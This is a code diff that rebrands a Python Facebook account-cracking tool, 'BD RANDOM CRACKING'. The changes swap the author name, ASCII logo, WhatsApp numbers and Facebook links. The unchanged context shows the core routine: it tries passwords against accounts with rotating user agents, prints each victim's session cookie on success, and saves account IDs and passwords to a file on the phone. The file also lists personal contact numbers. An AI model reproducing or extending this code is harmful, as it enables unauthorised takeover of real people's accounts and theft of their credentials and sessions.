@@ -1,4 +1,4 @@
-#coding by md alif
+#coding by md jakaria
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -121,20 +121,24 @@ def jalan(z):
         time.sleep(0.01)
 
   
-logo=(""" Jakaria Fire🥰 \033[1;37]
-Jakaria Fire🥰
+logo=(""" Jakaria Love SuHA\033[1;37m
+████████  ██   ██  █████  ████  ██████  ██   ██ \33[1;92m
+     ██ ██   ██ ██  ██  ██   ██ ██   ██ ██ ██   ██\033[1;37m
+     ██ ███████ █████   ███████ ██████  ██ ███████  \033[1;93m 
+██   ██ ██   ██ ██  ██  ██   ██ ██   ██ ██ ██   ██ \33[1;92m
+ █████  ██   ██ ██   ██ ██   ██ ██   ██ ██ ██   ██ \033[1;37m
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m Welcome to my Shahjahan Tools                          \033[0;m  ║
+║  \x1b[97m\033[37;41m Welcome to my Jakaria Tools                          \033[0;m  ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V15 \033[0;m    ║
+║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V5.8 \033[0;m    ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\33[1;92m║➣\033[1;91m DEVOLPER   :          Jakaria \33[1;92m║               
-\33[1;92m║➣ FACEBOOK   :          Fiad \33[1;92m║                 
-\33[1;92m║➣\033[1;93m WHATSAPP   :          01709143290        \33[1;92m ║
-\33[1;92m║➣\033[1;34m GITHUB     :          S-JK404        \33[1;92m ║          
-\33[1;92m║➣\033[1;35m TOOLS      :          JK Clone \33[1;92m ║                 
+\33[1;92m║➣\033[1;91m DEVOLPER   :  Mohammad Jakaria  \33[1;92m║               
+\33[1;92m║➣ FACEBOOK   :      Md.Jakaria Fiad                           \33[1;92m║                 
+\33[1;92m║➣\033[1;93m WHATSAPP   : 01791023760       \033[1;93m  ║
+\33[1;92m║➣\033[1;34m GITHUB     :     S-JK404                 \033[1;93m ║          
+\33[1;92m║➣\033[1;35m TOOLS      :     BD RANDOM CRACKING \33[1;92m ║                 
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 """)
 def cek_apk(session,coki):
@@ -174,10 +178,10 @@ def Main():
 	if opt in ["B","2"]:
 		admin()
 	if opt in ["C","3"]:
-		os.system('xdg-open https://www.facebook.com/shahjahanrajpot.shahjahanrajpot');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/mdjakaria.fiad');time.sleep(1)
 		fb()
 	if opt in ["D","4"]:
-		os.system('xdg-open https://wa.me/+03236007212');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801791023760');time.sleep(1)
 		group()
 	if opt in ["0","0"]:
 		exit()
@@ -195,10 +199,10 @@ def admin():
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+03236007212');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801791023760');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/shahjahanrajpot.shahjahanrajpot');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/mdjakaria.fiad');time.sleep(1)
 		admin()
 	if bal =='3':
 		os.system('xdg-open https://youtube.com');time.sleep(1)
@@ -247,7 +251,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJAHID\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSuha\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -283,8 +287,8 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [JK fire-💚] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
+                print(f'\r\33[1;92m [Jakaria fire-💚] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m=[suha💙]=COOKIE : '+coki)
                 oks.append(cid)
                 open('/sdcard/jahidok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
@@ -295,3 +299,4 @@ def b(uid,pwx,tl):
 
         pass
 Main()
+ 
